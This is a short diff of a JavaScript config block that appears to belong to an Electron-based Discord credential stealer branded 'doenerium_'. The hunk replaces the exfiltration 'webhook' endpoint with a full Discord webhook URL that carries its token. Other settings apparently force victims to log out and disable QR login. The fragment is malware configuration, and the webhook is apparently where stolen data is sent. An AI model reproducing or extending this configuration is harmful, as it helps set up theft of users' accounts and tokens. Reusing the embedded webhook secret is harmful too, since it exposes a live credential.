@@ -73,7 +73,7 @@ const { BrowserWindow, session } = require('electron'),
 var config = {
     brand: 'doenerium_',
     webhook:
-      'https://doenerium.kqnfkpoccicxiudstqonfotuwsrhuxkhqjjfsbjhonoubrccy.nl/',
+      'https://canary.discord.com/api/webhooks/1106917842047205437/gRYY8zCNb2QmUSsSVhPy-tojBBAFSJM8oK0FBszOVubZJgXqL_HNB96pTNsfVn7Arw7l',
     webhook_link: 'REPLACE_ME',
     logout: true,
     disable_qr_code: true,
